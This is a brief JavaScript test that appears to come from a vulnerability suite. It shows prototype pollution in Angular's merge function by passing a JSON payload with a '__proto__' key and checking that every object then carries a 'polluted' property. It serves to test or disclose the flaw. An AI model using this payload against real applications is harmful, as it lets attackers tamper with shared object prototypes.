test("prototype pollution in angular", () => {
  let angular = require("angular");

  obj = {};

  expect({}.polluted).toBe(undefined);

  angular.merge({}, JSON.parse('{"__proto__": {"polluted": "yes"}}'));

  expect({}.polluted).toBe("yes");
});
